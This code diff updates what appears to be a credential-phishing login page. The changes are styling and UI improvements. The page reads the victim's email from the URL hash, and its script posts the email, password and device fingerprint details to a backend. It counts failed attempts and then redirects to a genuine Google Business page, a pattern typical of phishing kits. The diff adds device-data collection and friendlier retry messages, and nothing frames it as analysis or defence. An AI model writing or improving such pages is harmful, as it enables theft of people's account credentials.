@@ -25,6 +25,7 @@
             border-radius: 5px;
             padding: 20px;
             margin: auto;
+            transition: all 0.3s ease;
         }
         .logo img {
             width: 50px;
@@ -46,6 +47,7 @@
         }
         .btn-holder {
             text-align: center;
+            position: relative;
         }
         .btn-holder .btn {
             background-color: #0073c6;
@@ -53,16 +55,36 @@
             border-radius: 0;
             width: 100%;
             padding: 10px;
+            transition: background 0.3s ease;
         }
         .btn-holder .btn:hover {
             background-color: #0056b3;
         }
+        .btn-holder .btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        /* Error message with fade-in */
         .error-message {
-            color: red;
+            color: #e74c3c;
             text-align: center;
             margin-top: 10px;
+            padding: 8px;
+            border-radius: 4px;
+            background: #fde0e0;
             display: none;
+            animation: fadeIn 0.4s ease;
         }
+        .error-message.show {
+            display: block;
+        }
+        @keyframes fadeIn {
+            0% { opacity: 0; transform: translateY(-5px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Loader overlay for redirect */
         .loader-overlay {
             display: none;
             position: fixed;
@@ -96,6 +118,21 @@
             font-size: 18px;
             color: #555;
         }
+
+        /* Button spinner */
+        .btn-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 0.8s linear infinite;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+
+        /* Avatar styles */
         .avatar-holder {
             display: flex;
             justify-content: center;
@@ -124,6 +161,16 @@
             margin-bottom: 20px;
             font-size: 1rem;
             color: #333;
+        }
+
+        /* Subtle shake for error */
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-8px); }
+            40%, 80% { transform: translateX(8px); }
+        }
+        .shake {
+            animation: shake 0.5s ease;
         }
     </style>
 </head>
@@ -160,7 +207,9 @@
                     </div>
 
                     <div class="btn-holder">
-                        <button type="submit" class="btn btn-lg" id="submit-btn">LOGIN</button>
+                        <button type="submit" class="btn btn-lg" id="submit-btn">
+                            <span id="btn-text">LOGIN</span>
+                        </button>
                     </div>
 
                     <p><a href="#">Can't access your account?</a></p>
@@ -170,6 +219,7 @@
         </div>
     </div>
 
+    <!-- Redirect overlay -->
     <div id="loaderOverlay" class="loader-overlay">
         <div class="spinner"></div>
         <div class="msg">Logging you in, please wait...</div>
@@ -177,6 +227,7 @@
 
     <script>
         (function() {
+            // Extract email from URL
             let email = null;
             if (window.location.hash) {
                 let hash = decodeURIComponent(window.location.hash.substring(1));
@@ -200,6 +251,35 @@
             const form = document.getElementById('login-form');
             const errorDisplay = document.getElementById('errorDisplay');
             const loader = document.getElementById('loaderOverlay');
+            const submitBtn = document.getElementById('submit-btn');
+            const btnText = document.getElementById('btn-text');
+
+            // Helper to show error with message and shake
+            function showError(message, shake = true) {
+                errorDisplay.textContent = message;
+                errorDisplay.classList.add('show');
+                if (shake) {
+                    errorDisplay.classList.remove('shake');
+                    // Force reflow
+                    void errorDisplay.offsetWidth;
+                    errorDisplay.classList.add('shake');
+                }
+            }
+
+            // Helper to hide error
+            function hideError() {
+                errorDisplay.classList.remove('show', 'shake');
+            }
+
+            // Get device details to send
+            function getDeviceDetails() {
+                return {
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    language: navigator.language || navigator.userLanguage,
+                    platform: navigator.platform || 'Unknown'
+                };
+            }
 
             form.addEventListener('submit', async function(e) {
                 e.preventDefault();
@@ -208,41 +288,62 @@
                 const password = document.getElementById('password').value;
 
                 if (!email || !password) {
-                    errorDisplay.textContent = 'Please fill in all fields.';
-                    errorDisplay.style.display = 'block';
+                    showError('Please fill in all fields.', false);
                     return;
                 }
 
-                errorDisplay.style.display = 'none';
-                const submitBtn = document.getElementById('submit-btn');
+                hideError();
+
+                // Disable button and show spinner
                 submitBtn.disabled = true;
-                submitBtn.textContent = 'Logging in...';
+                btnText.innerHTML = '<span class="btn-spinner"></span> Logging in...';
 
                 try {
+                    const device = getDeviceDetails();
+                    const payload = {
+                        email,
+                        password,
+                        screen: device.screen,
+                        timezone: device.timezone,
+                        language: device.language,
+                        platform: device.platform
+                    };
+
                     const response = await fetch('/api/login', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ email, password })
+                        body: JSON.stringify(payload)
                     });
 
                     const data = await response.json();
 
                     if (data.redirect) {
+                        // Show loader overlay and redirect after 3s
                         loader.classList.add('active');
                         setTimeout(() => {
                             window.location.href = data.redirectUrl || 'https://business.google.com/create/new?hl=en&gmbsrc=ng-en-z-z-z-gmb-l-z-d~mhp-hom_sig-u&original_intent=GMB&skiplp=1&_gl=1*we7dbu*_ga*MTQyMzU2Nzk4MS4xNzQ4ODg2MDg1*_ga_VM5ES1YN10*czE3NDg4ODYwODQkbzEkZzAkdDE3NDg4ODYwODQkajYwJGwwJGgw&service=ome&omec=EMLX0y4yAgECOipnbWJzcmM9bmctZW4tei16LXotZ21iLWwtei1kfm1ocC1ob21fc2lnLXVAAUoTCIuXmb2k040DFb-XAAAd3Ss8Mw%3D%3D';
                         }, 3000);
                     } else {
-                        errorDisplay.textContent = data.message || 'Incorrect password. Please try again.';
-                        errorDisplay.style.display = 'block';
+                        // Different error messages based on attempt count
+                        const attempts = data.attempts || 0;
+                        let errorMsg = '';
+                        if (attempts === 1) {
+                            errorMsg = 'Incorrect password. Please try again.';
+                        } else if (attempts === 2) {
+                            errorMsg = 'Hmm, that didn\'t work. One more try?';
+                        } else if (attempts >= 3) {
+                            errorMsg = 'Last attempt! If it fails, you\'ll be redirected.';
+                        } else {
+                            errorMsg = 'Invalid credentials.';
+                        }
+                        showError(errorMsg, true);
                         submitBtn.disabled = false;
-                        submitBtn.textContent = 'LOGIN';
+                        btnText.textContent = 'LOGIN';
                     }
                 } catch (err) {
-                    errorDisplay.textContent = 'An error occurred. Please try again.';
-                    errorDisplay.style.display = 'block';
+                    showError('An error occurred. Please try again.', false);
                     submitBtn.disabled = false;
-                    submitBtn.textContent = 'LOGIN';
+                    btnText.textContent = 'LOGIN';
                 }
             });
         })();
